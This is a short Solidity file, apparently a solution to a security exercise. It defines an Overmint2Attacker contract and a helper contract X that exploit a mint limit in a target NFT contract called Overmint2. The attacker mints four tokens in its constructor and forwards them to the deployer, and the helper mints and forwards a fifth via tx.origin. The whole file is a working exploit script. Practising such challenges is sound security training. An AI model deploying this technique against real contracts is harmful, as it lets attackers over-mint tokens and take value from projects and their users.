// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;

import "hardhat/console.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "./Overmint2.sol";

contract X {
    Overmint2 public target;

    constructor(address _target) {
        target = Overmint2(_target);
    }

    function attack() public {
        target.mint();
        target.transferFrom(address(this), tx.origin, 5);
    }
}

contract Overmint2Attacker {
    Overmint2 public target;

    constructor(address _target) {
        target = Overmint2(_target);
        X x = new X(_target);

        for (uint256 i; i < 4; i++) {
            target.mint();
        }

        for (uint256 i = 1; i < 5; i++) {
            target.transferFrom(address(this), msg.sender, i);
        }

        x.attack();
    }
}
